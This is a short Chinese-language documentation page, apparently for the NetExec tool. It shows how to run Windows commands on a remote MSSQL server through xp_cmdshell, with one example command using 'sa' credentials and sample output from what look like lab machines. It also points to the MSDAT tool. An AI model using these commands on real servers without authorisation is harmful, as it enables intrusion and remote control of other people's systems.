---
description: 使用 NetExec 执行 Windows 命令
---

# Windows 命令

### 执行 Windows 命令

此选项使用 `xp_cmdshell` 在远程主机上执行命令。

```
#~ nxc mssql 10.10.10.59 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami
MSSQL       10.10.10.59     1433   None             [+] sa:GWE3V65#6KFH93@4GWTG2G (Pwn3d!)
MSSQL       10.10.10.59     1433   None             [+] Executed command via mssqlexec
MSSQL       10.10.10.59     1433   None             --------------------------------------------------------------------------------
MSSQL       10.10.10.59     1433   None             tally\sarah
```

如果权限被**拒绝**:

```
MSSQL       10.10.10.52     1433   None             [+] admin:m$$ql_S@_P@ssW0rd! (Pwn3d!)
MSSQL       10.10.10.52     1433   None             [-] ERROR(MANTIS\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
MSSQL       10.10.10.52     1433   None             [+] Executed command via mssqlexec
MSSQL       10.10.10.52     1433   None             None
```

{% hint style="info" %}
在使用 MSSQL 时,你可以使用 [quentinhardy](https://github.com/quentinhardy) 开发的工具 [MSDAT](https://github.com/quentinhardy/msdat)
{% endhint %}

{% embed url="https://github.com/quentinhardy/msdat" %}
